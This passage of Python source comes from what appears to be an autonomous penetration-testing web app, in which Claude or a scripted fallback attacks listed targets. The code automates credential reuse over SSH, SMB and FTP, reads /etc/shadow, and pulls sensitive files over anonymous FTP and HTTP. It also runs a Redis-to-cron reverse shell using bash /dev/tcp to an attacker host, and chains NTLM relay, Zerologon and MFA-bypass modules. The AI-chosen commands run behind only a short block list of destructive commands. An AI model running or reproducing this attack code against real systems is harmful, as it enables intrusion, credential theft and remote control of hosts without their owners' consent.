        sev_breakdown = {s: sum(1 for f in findings if f.get("severity")==s)
                         for s in ("critical","high","medium","low","info")}
        surface = {
            "target": target,
            "score": round(raw, 1),
            "grade": ("A" if raw < 20 else "B" if raw < 40 else "C" if raw < 60 else "D" if raw < 80 else "F"),
            "open_ports": port_count,
            "services": svc_diversity,
            "risky_services": risky_count,
            "web_exposed": web_count,
            "total_findings": len(findings),
            "severity_breakdown": sev_breakdown,
            "risk_zones": {
                "network": round(min(10, port_count * 0.3 + risky_count * 2), 1),
                "web": round(min(10, web_count * 2 + sum(1 for f in findings if any(w in f.get("title","").lower() for w in ["xss","sqli","injection","rce","lfi","ssrf"]))), 1),
                "credentials": round(min(10, sum(1 for f in findings if any(w in f.get("title","").lower() for w in ["credential","password","brute","auth","login"]))), 1),
                "vulns": round(min(10, finding_score * 0.08), 1),
            },
            "calculated_at": datetime.now().isoformat(),
        }
        with self._project_lock:
            proj = read_project(self.project_id)
            if proj:
                proj.setdefault("attack_surface_scores", []).append(surface)
                write_project(proj)
        self._log(f"[S5-ASS] Score: {raw:.1f}/100 (grade {surface['grade']}) | crits={sev_breakdown.get('critical',0)}")

    # ──────────────────────────────────────────────────────────────────────
    # BUG7 FIX: Deterministic post-exploitation fallback (no API key needed)
    # Runs when ANTHROPIC_API_KEY is absent or Claude call fails.
    # Covers: privilege escalation, credential reuse, flag hunting.
    # ──────────────────────────────────────────────────────────────────────
    def _phase5_no_api_fallback(self, target, open_ports, accumulated_output):
        self._log("[Fallback] ══ Iniciando post-explotación determinística (sin API key) ══")

        # ── 1. Collect all verified credentials found so far ─────────────
        proj = read_project(self.project_id)
        findings_list = proj.get("findings", []) if proj else []
        cred_pairs: list[tuple[str, str]] = []
        import re as _re
        for f in findings_list:
            raw_desc = f.get("description", "") + " " + f.get("title", "")
            # Pattern: user:pass, user / pass, Username: X Password: Y
            for m in _re.finditer(
                r"(?:user(?:name)?[:\s]+)(\S+)(?:[:\s/]+)(?:pass(?:word)?[:\s]+)?(\S+)",
                raw_desc, _re.IGNORECASE
            ):
                u, p = m.group(1).strip(":"), m.group(2).strip(":")
                if u and p and len(p) < 64:
                    cred_pairs.append((u, p))
        # De-dup
        cred_pairs = list(dict.fromkeys(cred_pairs))
        self._log(f"[Fallback] Credenciales recopiladas: {len(cred_pairs)}")

        port_set = set(open_ports)

        # ── 2. Try creds on discovered services ──────────────────────────
        for user, passwd in cred_pairs[:10]:   # cap at 10 pairs to avoid huge runtime
            # SSH
            if 22 in port_set:
                out, _ = self._run_cmd(
                    "fallback-ssh-login",
                    f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
                    f"-o ConnectTimeout=8 -o BatchMode=no {user}@{target} "
                    f"'id; uname -a; cat /etc/passwd | head -5' 2>&1",
                    timeout=20
                )
                if out and any(x in out for x in ["uid=", "root", "Linux", "Darwin"]):
                    self._log(f"[Fallback] ✔ SSH login con {user}:{passwd}")
                    self._save_findings([{
                        "title": f"Valid SSH Credentials: {user}",
                        "severity": "critical",
                        "description": f"SSH login successful with {user}:{passwd}. Output: {out[:400]}",
                        "host": target, "port": 22,
                    }])
                    accumulated_output.append(f"SSH shell as {user}: {out[:800]}")
                    # Post-exploit on the same creds
                    for cmd in [
                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'sudo -l 2>/dev/null'",
                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'find / -perm -4000 -type f 2>/dev/null | head -20'",
                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null'",
                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'cat /etc/shadow 2>/dev/null | head -5'",
                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'find / -name user.txt -o -name root.txt -o -name flag.txt 2>/dev/null | xargs cat 2>/dev/null'",
                    ]:
                        pout, _ = self._run_cmd("fallback-post-ssh", cmd, timeout=25)
                        if pout and pout.strip():
                            accumulated_output.append(pout[:600])
                            self._log(f"[Fallback] Post-exploit SSH: {pout[:120]}")
                            if "NOPASSWD" in pout:
                                self._save_findings([{
                                    "title": "Sudo NOPASSWD — Privilege Escalation Vector",
                                    "severity": "critical",
                                    "description": f"User {user} can run sudo without password:\n{pout[:500]}",
                                    "host": target, "port": 22,
                                }])
                            if any(x in pout for x in ["HTB{", "THM{", "FLAG{", "flag{"]):
                                self._save_findings([{
                                    "title": "CTF Flag Captured",
                                    "severity": "critical",
                                    "description": f"Flag found: {pout[:300]}",
                                    "host": target, "port": 22,
                                }])

            # SMB (445)
            if 445 in port_set:
                out, _ = self._run_cmd(
                    "fallback-smb-login",
                    f"crackmapexec smb {target} -u '{user}' -p '{passwd}' --shares 2>&1",
                    timeout=30
                )
                if out and "[+]" in out:
                    self._log(f"[Fallback] ✔ SMB login con {user}:{passwd}")
                    self._save_findings([{
                        "title": f"Valid SMB Credentials: {user}",
                        "severity": "high",
                        "description": f"SMB login successful: {out[:400]}",
                        "host": target, "port": 445,
                    }])
                    accumulated_output.append(f"SMB as {user}: {out[:600]}")

            # FTP (21)
            if 21 in port_set:
                out, _ = self._run_cmd(
                    "fallback-ftp-login",
                    f"curl -s --connect-timeout 8 ftp://{user}:{passwd}@{target}/ 2>&1",
                    timeout=20
                )
                if out and ("ftp" in out.lower() or "/" in out):
                    self._log(f"[Fallback] ✔ FTP login con {user}:{passwd}")
                    self._save_findings([{
                        "title": f"Valid FTP Credentials: {user}",
                        "severity": "high",
                        "description": f"FTP login successful: {out[:400]}",
                        "host": target, "port": 21,
                    }])

        # ── 3. Anonymous / unauthenticated checks ────────────────────────
        # FTP anonymous
        if 21 in port_set:
            out, _ = self._run_cmd(
                "fallback-ftp-anon",
                f"curl -s --connect-timeout 8 ftp://anonymous:anonymous@{target}/ 2>&1",
                timeout=20
            )
            if out and "ftp" in out.lower():
                self._save_findings([{
                    "title": "FTP Anonymous Login",
                    "severity": "high",
                    "description": f"FTP anonymous access confirmed. Listing: {out[:400]}",
                    "host": target, "port": 21,
                }])
                self._log("[Fallback] ✔ FTP anónimo accesible")
                # Try to grab sensitive files
                for fname in ["/etc/passwd", "/.bash_history", "/flag.txt", "/user.txt"]:
                    fout, _ = self._run_cmd(
                        "fallback-ftp-get",
                        f"curl -s --connect-timeout 8 ftp://anonymous:anonymous@{target}{fname} 2>&1",
                        timeout=15
                    )
                    if fout and len(fout) > 10 and "failed" not in fout.lower():
                        self._save_findings([{
                            "title": f"FTP Sensitive File Exposed: {fname}",
                            "severity": "critical",
                            "description": f"Content: {fout[:500]}",
                            "host": target, "port": 21,
                        }])

        # Redis unauthenticated
        if 6379 in port_set:
            out, _ = self._run_cmd(
                "fallback-redis-info",
                f"redis-cli -h {target} -p 6379 INFO server 2>&1",
                timeout=15
            )
            if out and "redis_version" in out:
                self._save_findings([{
                    "title": "Redis Unauthenticated Access",
                    "severity": "critical",
                    "description": f"Redis accessible without authentication. INFO: {out[:400]}",
                    "host": target, "port": 6379,
                }])
                self._log("[Fallback] ✔ Redis sin autenticación")
                # Attempt RCE via cron
                rce_cmds = [
                    f"redis-cli -h {target} SET fallback_test '\\n\\n*/1 * * * * root bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\\n\\n'",
                    f"redis-cli -h {target} CONFIG SET dir /etc/cron.d",
                    f"redis-cli -h {target} CONFIG SET dbfilename pentsuite_pwn",
                    f"redis-cli -h {target} SAVE",
                ]
                for rc in rce_cmds:
                    self._run_cmd("fallback-redis-rce", rc, timeout=10)
                self._log("[Fallback] Redis RCE via cron intentado")

        # MySQL empty password
        if 3306 in port_set:
            out, _ = self._run_cmd(
                "fallback-mysql-empty",
                f"mysql -h {target} -u root --connect-timeout=8 -e 'SHOW DATABASES;' 2>&1",
                timeout=20
            )
            if out and "Database" in out and "error" not in out.lower():
                self._save_findings([{
                    "title": "MySQL Empty Root Password",
                    "severity": "critical",
                    "description": f"MySQL root login without password succeeded. DBs: {out[:400]}",
                    "host": target, "port": 3306,
                }])
                self._log("[Fallback] ✔ MySQL root sin contraseña")

        # ── 4. SUID / privesc quick scan via any existing shell ───────────
        # If we already have meterpreter/shell output in accumulated_output, grep for privesc hints
        full_context = "\n".join(str(x) for x in accumulated_output)
        if _re.search(r"uid=\d+|root@|meterpreter", full_context, _re.IGNORECASE):
            self._log("[Fallback] Shell activa detectada en contexto acumulado — buscando privesc")
            privesc_hints = []
            if "NOPASSWD" in full_context:
                privesc_hints.append("sudo NOPASSWD")
            for suid in ["/usr/bin/find", "/usr/bin/python", "/usr/bin/perl", "/usr/bin/nmap",
                         "/bin/bash", "/usr/bin/vim", "/usr/bin/less", "/usr/bin/more"]:
                if suid in full_context:
                    privesc_hints.append(f"SUID binary: {suid}")
            if privesc_hints:
                self._save_findings([{
                    "title": "Privilege Escalation Vectors Detected",
                    "severity": "critical",
                    "description": "Privesc hints found in post-exploit output:\n" + "\n".join(privesc_hints),
                    "host": target,
                }])

        # ── 5. Flag hunting via web paths (if HTTP open) ─────────────────
        for http_port in [p for p in open_ports if p in (80, 443, 8080, 8443, 8000, 8888)]:
            scheme = "https" if http_port in (443, 8443) else "http"
            for path in ["/flag.txt", "/user.txt", "/root.txt", "/.git/HEAD",
                         "/.env", "/config.php", "/wp-config.php", "/backup.zip"]:
                fout, _ = self._run_cmd(
                    "fallback-http-file",
                    f"curl -sk --connect-timeout 6 -o - {scheme}://{target}:{http_port}{path} 2>&1",
                    timeout=15
                )
                if fout and len(fout) > 4 and not any(x in fout for x in ["404", "Not Found", "curl: "]):
                    self._save_findings([{
                        "title": f"Sensitive File Exposed via HTTP: {path}",
                        "severity": "critical" if any(k in path for k in ["flag", "user", "root", ".env", "config"]) else "high",
                        "description": f"File accessible at {scheme}://{target}:{http_port}{path}\nContent: {fout[:400]}",
                        "host": target, "port": http_port,
                    }])
                    self._log(f"[Fallback] ✔ Archivo sensible expuesto: {path}")

        # ── 6. Run vuln chain one final time with full context ────────────
        self._log("[Fallback] Ejecutando vuln-chain final con contexto completo...")
        self._vuln_chain_engine(target, open_ports, accumulated_output)

        self._log("[Fallback] ══ Post-explotación determinística completada ══")

    def _loop_target(self, target):
        self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
        context_parts = [
            f"Target: {target}",
            f"Attacker LHOST: {self.lhost}, LPORT: {self.lport}",
        ]
        accumulated_output = []  # Full output from all phases

        # ── FASE 1: Fast port discovery ───────────────────────────────────
        self._log(f"[Claude] Fase 1/5: Descubrimiento de puertos → {target}")
        fast_out, _ = self._run_cmd(
            "nmap-fast-ports",
            f"nmap --open -T4 -p- --min-rate 2000 --max-retries 1 {target} 2>/dev/null",
            target, timeout=200,
        )
        port_matches = re.findall(r'(\d+)/tcp\s+open', fast_out)
        if port_matches:
            port_str = ",".join(dict.fromkeys(port_matches))
        else:
            # Fallback: common ports
            port_str = "21,22,23,25,53,80,110,111,135,139,143,443,445,512,513,514,587,631,993,995,1099,1433,1521,1723,2049,3306,3389,4848,5432,5900,5985,6379,8080,8443,8888,9200,27017"
        self._log(f"[Claude] Puertos detectados: {port_str[:120]}")

        # ── FASE 1.5: UDP scan + SNMP + OSINT (in parallel with deep TCP scan) ──
        import concurrent.futures as _cf0
        _udp_future = None
        _osint_future = None
        _udp_exec = _cf0.ThreadPoolExecutor(max_workers=2, thread_name_prefix="bg")
        _udp_future = _udp_exec.submit(self._udp_snmp_scan, target, accumulated_output)
        # open_ports not yet defined — _osint_recon uses [] and will discover ports itself via DNS/cert/shodan
        _osint_future = _udp_exec.submit(self._osint_recon, target, [], accumulated_output)

        # ── FASE 2: Deep scan con versiones + vuln scripts ────────────────
        self._log(f"[Claude] Fase 2/5: Scan profundo con vuln scripts")
        # BUG6 FIX: original filter had smb-vuln-ms17-010, ftp-vsftpd-backdoor, mysql-empty-password
        # etc. in the NOT list → EternalBlue, vsftpd backdoor, MySQL empty root NEVER detected.
        # Fix: NOT list contains ONLY pure-DoS + noisy info scripts.
        # Critical vuln scripts are force-added via second --script argument.
        deep_out, _ = self._run_cmd(
            "nmap-deep-vuln",
            f"nmap -sV -sC --open -T4 -p {port_str} "
            # Run all 'vuln' category scripts EXCEPT pure-DoS and noisy info ones
            f"--script='vuln and not (dos or smb-flood or http-slowloris or http-form-fuzzer "
            f"or banner or smtp-commands or ssh-hostkey or ftp-syst or http-headers or smb-security-mode)' "
            # Force-add the most critical individual scripts (in case they're not in 'vuln' category on this nmap build)
            f"--script=ftp-anon,ftp-vsftpd-backdoor,smb-vuln-ms17-010,smb-vuln-ms08-067,"
            f"smb-double-pulsar-backdoor,irc-unrealircd-backdoor,mysql-empty-password,redis-info "
            f"--script-timeout 45s {target} 2>/dev/null",
            target, timeout=420,
        )
        accumulated_output.append(f"=== NMAP DEEP SCAN + VULN SCRIPTS ===\n{deep_out[:3000]}")

        open_ports = self._save_ports(deep_out, target)
        parsed_initial = _parse_tool_output("nmap", deep_out, target, "nmap-deep")
        if parsed_initial.get("findings"):
            self._save_findings(parsed_initial["findings"], target)
            for f in parsed_initial["findings"]:
                lvl = f.get("severity", "?").upper()
                context_parts.append(f"NMAP-VULN: {lvl} — {f.get('title','?')}")

        if open_ports:
            port_summary = ", ".join(f"{p['port']}/{p['service']} {p['version'][:20]}" for p in open_ports[:18])
            context_parts.append(f"Servicios: {port_summary}")
            self._log(f"[Claude] {len(open_ports)} servicios: {port_summary[:140]}")
            self._update_attack_path(target, open_ports)
            self._last_open_ports = open_ports  # used by _windows_post_exploit for AD detection
        else:
            self._log(f"[Claude] Sin puertos abiertos — abortando target {target}")
            return

        # ── FASES 3+4+4w: Paralelas — exploits + enum + web ─────────────
        # Phase 3 (version exploits) and Phase 4 (KB enum) run concurrently
        # Web phases (fuzz, CMS, Log4Shell, SQLmap) run in a third thread
        import concurrent.futures as _cf

        def _phase3():
            self._log(f"[Claude] Fase 3 [parallel]: Auto-exploits por versión + Enterprise + Container/K8s + Cloud + CVE + Nuclei-Gen")
            self._auto_exploit_by_version(target, open_ports, accumulated_output)
            self._enterprise_exploits(target, open_ports, accumulated_output)
            self._container_k8s_escape(target, open_ports, accumulated_output)
            self._cloud_attack(target, open_ports, accumulated_output)
            self._ics_scada_scan(target, open_ports, accumulated_output)
            self._cve_feed_check(target, open_ports, accumulated_output)
            # P3: auto-generate Nuclei templates from detected tech
            self._nuclei_template_gen(target, open_ports, accumulated_output)

        def _phase4():
            self._log(f"[Claude] Fase 4 [parallel]: Enum + ICS + Wireless + Vuln-Chain + Custom-WL")
            self._run_kb_phase(target, open_ports, accumulated_output)
            self._wireless_audit(target, accumulated_output)
            self._stealth_recon(target, open_ports, accumulated_output)
            # C1: vuln chaining — run after initial enum gathers findings
            self._vuln_chain_engine(target, open_ports, accumulated_output)
            # P2: custom wordlist from OSINT data
            self._custom_wordlist_gen(target, open_ports, accumulated_output)

        def _phase4w():
            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap + AdvWeb + API + Supply Chain + XSS + BL + WS + MFA")
            self._web_fuzz(target, open_ports, accumulated_output)
            self._cms_exploit(target, open_ports, accumulated_output)
            self._log4shell_scan(target, open_ports, accumulated_output)
            self._sqlmap_auto(target, open_ports, accumulated_output)
            self._file_upload_exploit(target, open_ports, accumulated_output)
            self._subdomain_vhost_enum(target, open_ports, accumulated_output)
            self._advanced_web_scan(target, open_ports, accumulated_output)
            self._advanced_web_exploits(target, open_ports, accumulated_output)
            self._api_security_test(target, open_ports, accumulated_output)
            self._mobile_api_backend(target, open_ports, accumulated_output)
            self._supply_chain_check(target, open_ports, accumulated_output)
            # P1: XSS auto-exploit with cookie beacon
            self._xss_auto_exploit(target, open_ports, accumulated_output)
            # P4: business logic testing
            self._business_logic_test(target, open_ports, accumulated_output)
            # P5: WebSocket security
            self._websocket_security(target, open_ports, accumulated_output)
            # P6: 2FA/MFA bypass
            self._mfa_bypass(target, open_ports, accumulated_output)

        def _phase4n():
            self._log(f"[Claude] Fase 4n [parallel]: Network attacks — NTLM relay, Zerologon, AD enum + Coercion + Creds")
            self._ntlm_relay_attack(target, open_ports, accumulated_output)
            self._zerologon_attack(target, open_ports, accumulated_output)
            self._advanced_service_enum(target, open_ports, accumulated_output)
            self._advanced_credential_attacks(target, open_ports, accumulated_output)

        self._log(f"[Claude] Iniciando Fases 3+4+4w+4n en paralelo (7 threads)")
        with _cf.ThreadPoolExecutor(max_workers=7, thread_name_prefix="pentest") as executor:
            f3 = executor.submit(_phase3)
            f4 = executor.submit(_phase4)
            f4w = executor.submit(_phase4w)
            f4n = executor.submit(_phase4n)
            # Wait for all, surface any exceptions
            for fut in _cf.as_completed([f3, f4, f4w, f4n]):
                try:
                    fut.result()
                except Exception as exc:
                    self._log(f"[Claude] Fase paralela excepción: {exc}")
        # Wait for UDP + OSINT background scans
        for _bg_fut in [_udp_future, _osint_future]:
            try:
                if _bg_fut:
                    _bg_fut.result(timeout=15)
            except Exception as _bg_exc:
                self._log(f"[Claude] BG task excepción: {_bg_exc}")
        try:
            _udp_exec.shutdown(wait=False)
        except Exception:
            pass
        self._log(f"[Claude] Fases 3+4+4w+4n completadas")

        # ── FASE 4b: Credential chaining con todo lo encontrado ─────────
        all_creds_so_far = re.findall(
            r'(?:230 Login|TOMCAT_CREDS_VALID|valid.*cred|Hydra.*login:|'
            r'\[\+\].*[Ss]uccess)[:\s]+(\w[\w\-\.]+:\S+)',
            "\n".join(accumulated_output),
            re.IGNORECASE,
        )
        # Also extract username:password patterns from tool outputs
        all_creds_so_far += re.findall(
            r'(?:username|user|login)[:\s]+(\w+)\s*[\n|].*?(?:password|pass)[:\s]+(\S+)',
            "\n".join(accumulated_output[-8:]),
            re.IGNORECASE | re.DOTALL,
        )
        flat_all = [f"{c[0]}:{c[1]}" if isinstance(c, tuple) else c for c in all_creds_so_far]
        if flat_all:
            self._log(f"[Claude] Fase 4b: Credential chaining — {len(flat_all)} credencial(es)")
            self._credential_chain(target, open_ports, flat_all, accumulated_output)

        # ── FASE 5: Bucle Claude AI — análisis + explotación avanzada ─────
        self._log(f"[Claude] Fase 5/5: Análisis IA y explotación avanzada")
        all_output = "\n\n".join(accumulated_output)

        # BUG7 FIX: if no API key, run deterministic post-exploit fallback instead of silently doing nothing
        if not os.environ.get("ANTHROPIC_API_KEY", "").strip():
            self._log("[Claude] Sin API key — ejecutando fallback post-exploit determinístico")
            self._phase5_no_api_fallback(target, open_ports, accumulated_output)
        else:
            for step in range(self.MAX_STEPS):
                if not self._running:
                    break

                context_summary = "\n".join(context_parts[-35:])
                decision = self._ask_claude(all_output[-7000:], target, context_summary)

                if not decision:
                    self._log(f"[Claude] Sin respuesta IA en paso {step + 1} — reintentando con fallback")
                    # BUG7 FIX: one API failure → fallback, not silent abort
                    self._phase5_no_api_fallback(target, open_ports, accumulated_output)
                    break

                findings = decision.get("findings", [])
                if findings:
                    self._save_findings(findings, target)
                    for f in findings:
                        context_parts.append(
                            f"FINDING: {f.get('severity','?').upper()} — {f.get('title','?')}"
                        )

                next_action = decision.get("next_action", {})
                action_type = next_action.get("type", "done")
                reason = next_action.get("reason", "")
                self._log(f"[Claude] AI Paso {step + 1}: {action_type} — {reason[:120]}")

                if action_type == "done":
                    self._log(f"[Claude] Pentest completado en {target} ({step + 1} pasos IA)")
                    break

                command = next_action.get("command", "").strip()
                if not command:
                    self._log(f"[Claude] Sin comando en paso {step + 1} — continuando")
                    continue  # BUG8 FIX: was 'break' — empty command should skip, not abort loop

                # Safety: block destructive commands
                BLOCKED = ["rm -rf /", "mkfs ", "dd if=/dev/zero", "> /dev/sda",
                           ":(){ :|:& };:", "chmod -R 777 /", "chown -R root /"]
                if any(bad in command for bad in BLOCKED):
                    self._log(f"[Claude] BLOQUEADO: {command[:80]}")
                    continue  # BUG8 FIX: was 'break' — one blocked cmd shouldn't stop the loop

                step_name = next_action.get("tool", "other") + f"-ai{step + 1}"
                is_heavy = any(t in command for t in
                               ["msfconsole", "hydra", "hashcat", "john", "sqlmap", "crackmapexec"])
                timeout = 600 if is_heavy else 300

                self._log(f"[Claude] Ejecutando: {command[:130]}")
                step_out, _ = self._run_cmd(step_name, command, target, timeout=timeout)

                if any(t in command.lower() for t in ["exploit", "msfconsole", "hydra", "sqlmap"]):
                    self.stats["exploits_run"] += 1

                self._capture_evidence(step_out, target, step_name, command)

                tool_hint = next_action.get("tool", "other").lower()
                step_parsed = _parse_tool_output(tool_hint, step_out, target, step_name)
                if step_parsed.get("findings"):
                    self._save_findings(step_parsed["findings"], target)

                all_output += f"\n\n=== AI-{step + 1} [{step_name}] ===\n{step_out[:1200]}"
                context_parts.append(
                    f"Paso AI-{step + 1} [{step_name}]: {step_out[:500].replace(chr(10), ' | ')}"
                )

        # ── S4: Replay PoC + S5: Attack Surface Score ─────────────────────────
        self._generate_replay_poc(target, accumulated_output)
        self._attack_surface_score(target, open_ports, accumulated_output)
        self._log(f"[Claude] ══ Finalizado → {target} ══")

    def _loop(self):
        try:
            for target in self.targets:
                if not self._running:
                    break
                self._loop_target(target)
        except Exception as e:
            self._log(f"[Claude] ERROR CRÍTICO: {e}")
        finally:
            self._running = False
            self._log("[Claude] Engine detenido")

    def start(self):
        self._running = True
        self._started_at = datetime.now().isoformat()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self._log(f"[Claude] Engine iniciado — targets: {self.targets}, modo: {self.mode}")

    def stop(self):
        self._running = False
        self._log("[Claude] Deteniendo engine...")

    def get_status(self):
        elapsed = 0
        if self._started_at:
            elapsed = int((datetime.now() - datetime.fromisoformat(self._started_at)).total_seconds())
        return {
            "running": self._running,
            "mode": self.mode,
            "targets": self.targets,
            "stats": self.stats,
            "queue_size": 0,
            "completed_jobs": self.stats.get("commands_run", 0),
            "timeline": self.timeline[-100:],
            "heatmap": self.heatmap,
            "elapsed_seconds": elapsed,
            "started_at": self._started_at,
            "memory": MEMORY.get_stats(),
            "pivot_networks": 0,
            "engine": "claude",
        }

    def get_log_since(self, offset):
        with self._brain_log_lock:
            return self._brain_log[offset:]


@app.route("/api/memory/stats")
@api_login_required
def memory_stats_api():
    return jsonify(MEMORY.get_stats())


@app.route("/api/config/anthropic-key", methods=["POST"])
@api_login_required
def set_anthropic_key():
    """Persist ANTHROPIC_API_KEY in the process environment for the session."""
    import os
    key = (request.json or {}).get("key", "").strip()
    if key:
        os.environ["ANTHROPIC_API_KEY"] = key
    return jsonify({"ok": bool(key)})


@app.route("/api/projects/<project_id>/autopilot/start", methods=["POST"])
@api_login_required
def autopilot_start(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    data = request.json or {}
    mode = data.get("mode", "normal")
    if mode not in MODE_CONFIG:
        return jsonify({"error": "mode must be stealth/normal/aggressive"}), 400
    targets_raw = data.get("targets", project.get("targets", []))
    if isinstance(targets_raw, str):
        targets_raw = [t.strip() for t in re.split(r'[\n,]+', targets_raw) if t.strip()]
    if not targets_raw:
        return jsonify({"error": "No targets defined"}), 400
    force = data.get("force", False)
    with AUTOPILOT_LOCK:
        eng = AUTOPILOT_ENGINES.get(project_id)
        if eng and eng._running:
            queue_empty = (not getattr(eng, "_job_queue", None) or eng._job_queue.empty()) \
                          and not getattr(eng, "_pivot_targets", None)
            if not force and not queue_empty:
                return jsonify({"error": "Already running"}), 409
            eng.stop()
        use_claude = bool(os.environ.get("ANTHROPIC_API_KEY", "").strip())
        if use_claude:
            engine = ClaudePentestEngine(
                project_id, targets_raw, mode,
                lhost=data.get("lhost", ""),
                lport=data.get("lport", "4444"),
            )
        else:
            engine = AutonomousEngine(
                project_id, targets_raw, mode,
                data.get("ollama_model", "llama3"),
                int(data.get("living_interval", 300)),
                lhost=data.get("lhost", ""),
                lport=data.get("lport", "4444"),
            )
        AUTOPILOT_ENGINES[project_id] = engine
        engine.start()
    engine_type = "claude" if use_claude else "autonomous"
    return jsonify({"ok": True, "mode": mode, "targets": targets_raw, "engine": engine_type}), 202


@app.route("/api/projects/<project_id>/autopilot/stop", methods=["POST"])
@api_login_required
def autopilot_stop(project_id):
    with AUTOPILOT_LOCK:
        eng = AUTOPILOT_ENGINES.get(project_id)
    if not eng:
        return jsonify({"error": "Not running"}), 404
    eng.stop()
    return jsonify({"ok": True})


@app.route("/api/projects/<project_id>/autopilot/status")
@api_login_required
def autopilot_status(project_id):
    with AUTOPILOT_LOCK:
        eng = AUTOPILOT_ENGINES.get(project_id)
    if not eng:
        return jsonify({"running": False, "timeline": [], "heatmap": {}, "stats": {}})
    return jsonify(eng.get_status())


@app.route("/api/projects/<project_id>/autopilot/log/stream")
@api_login_required
def autopilot_log_stream(project_id):
    def generate():
        offset = 0
        idle = 0
        while True:
            with AUTOPILOT_LOCK:
                eng = AUTOPILOT_ENGINES.get(project_id)
            if not eng:
                yield "event: done\ndata: not_found\n\n"
                return
            lines = eng.get_log_since(offset)
            for line in lines:
                yield f"data: {json.dumps(line)}\n\n"
            offset += len(lines)
            if not eng._running:
                idle += 1
                if idle > 4:
                    yield "event: done\ndata: stopped\n\n"
                    return
            time.sleep(0.5)
    return Response(stream_with_context(generate()), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/api/projects/<project_id>/autopilot/living_report")
@api_login_required
def autopilot_living_report(project_id):
    p = PROJECTS_DIR / f"{project_id}_living.html"
    if not p.exists():
        project = read_project(project_id)
        if not project:
            return jsonify({"error": "Not found"}), 404
        html = _generate_html_report(project)
    else:
        html = p.read_text(encoding="utf-8")
    resp = make_response(html)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    return resp


# ══════════════════════════════════════════════════════════════════════════════
# GREENBONE / OPENVAS INTEGRATION
# ══════════════════════════════════════════════════════════════════════════════

# Scan config UUIDs (standard Greenbone Community Edition)
GVM_SCAN_CONFIGS = {
    "full_fast":       "daba56c8-73ec-11df-a475-002264764cea",
    "full_fast_ult":   "8715c877-47a0-438d-98a3-27c7a6ab2196",
    "host_discovery":  "d21f6c81-2b88-4ac1-b7b4-a2a9f2ad4663",
    "web_app":         "aa8f9c78-0f47-4c92-b5b1-a3d70c94b9c5",  # many configs vary — verify with get_scan_configs
}
GVM_OPENVAS_SCANNER = "08b69003-5fc2-4037-a479-93b440211c73"
GVM_ALL_TCP_PORT_LIST = "33d0cd82-57c6-11e1-8ed1-406186ea4fc5"


def _gvm_exec(socket_path, gmp_user, gmp_pass, xml_query, timeout=60):
    """Run a GMP XML query via gvm-cli socket and return parsed ElementTree root."""
    import os as _os
    if not _os.path.exists(socket_path):
        raise ValueError(
            f"GVM socket no encontrado en '{socket_path}'. "
            "Comprueba que gvmd está corriendo: 'sudo systemctl status gvmd'"
        )

    env = os.environ.copy()
    env["PYTHONWARNINGS"] = "ignore"

    cmd = [
        "gvm-cli", "socket",
        "--socketpath", socket_path,
        "--gmp-username", gmp_user,
        "--gmp-password", gmp_pass,
        "--xml", xml_query,
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=env)
        xml_out = result.stdout.strip()
        if not xml_out:
            # Filtra DeprecationWarnings de Python del stderr para mostrar el error real
            real_stderr = "\n".join(
                line for line in result.stderr.splitlines()
                if "DeprecationWarning" not in line
                and "CryptographyDeprecationWarning" not in line
                and "has been moved to" not in line
                and "will be removed from" not in line
                and "cipher" not in line.lower()
                and "paramiko" not in line
            ).strip()
            detail = real_stderr or result.stderr[:500] or "(sin output)"
            raise ValueError(f"gvm-cli no devolvió XML. Posible causa: {detail}")
        return ET.fromstring(xml_out)
    except subprocess.TimeoutExpired:
        raise TimeoutError(f"gvm-cli timeout after {timeout}s")
    except ET.ParseError as e:
        raise ValueError(f"XML parse error: {e}")


def _gvm_severity_to_label(score):
    try:
        s = float(score)
    except (TypeError, ValueError):
        return "info"
    if s >= 9.0:
        return "critical"
    if s >= 7.0:
        return "high"
    if s >= 4.0:
        return "medium"
    if s > 0:
        return "low"
    return "info"


def _gvm_parse_report(report_xml_root, target_ip):
    """Parse GVM get_reports_response XML into our findings format."""
    findings = []
    seen_titles = set()

    results_el = report_xml_root.find(".//results")
    if results_el is None:
        return findings

    for result in results_el.findall("result"):
        name_el = result.find("name")
        name = (name_el.text or "").strip() if name_el is not None else "Unknown"
        if not name or name in ("Log", ""):
            continue

        host_el = result.find("host")
        host_ip = ""
        if host_el is not None:
            ip_el = host_el.find("ip")
            host_ip = (ip_el.text or "").strip() if ip_el is not None else (host_el.text or "").strip()

        port_el = result.find("port")
        port_str = (port_el.text or "").strip() if port_el is not None else ""

        sev_el = result.find("severity")
        cvss_score = None
        severity = "info"
        if sev_el is not None:
            try:
                cvss_score = float(sev_el.text or 0)
                severity = _gvm_severity_to_label(cvss_score)
            except ValueError:
                pass

        # Skip Log-level (score 0) unless it's a real finding
        if cvss_score is not None and cvss_score <= 0:
            continue

        nvt_el = result.find("nvt")
        cve = ""
        solution = ""
        if nvt_el is not None:
            cve_el = nvt_el.find("cve")
            if cve_el is not None and cve_el.text and cve_el.text.upper() != "NOCVE":
                cve_parts = [c.strip() for c in cve_el.text.split(",") if c.strip().startswith("CVE-")]
                cve = cve_parts[0] if cve_parts else ""

        sol_el = result.find("solution")
        if sol_el is not None:
            solution = (sol_el.text or "").strip()[:600]

        desc_el = result.find("description")
        description = (desc_el.text or "").strip()[:1500] if desc_el is not None else ""

        # evidence: port + raw description snippet
        ev_parts = []
        if port_str:
            ev_parts.append(f"Port: {port_str}")
        if host_ip:
            ev_parts.append(f"Host: {host_ip}")
        if description:
            ev_parts.append(f"\n{description[:800]}")

        title = f"[GVM] {name}"
        if title in seen_titles:
            continue
